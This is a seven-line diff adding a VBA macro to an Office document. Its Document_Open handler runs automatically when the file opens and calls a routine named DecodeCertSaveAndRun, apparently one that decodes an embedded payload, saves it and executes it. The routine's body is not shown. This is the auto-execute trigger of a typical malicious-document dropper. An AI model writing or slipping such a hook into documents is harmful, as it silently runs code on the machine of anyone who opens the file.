@@ -1,0 +1,7 @@
+Option Explicit
+
+' Fires when THIS document opens
+Private Sub Document_Open()
+    DecodeCertSaveAndRun
+End Sub
+
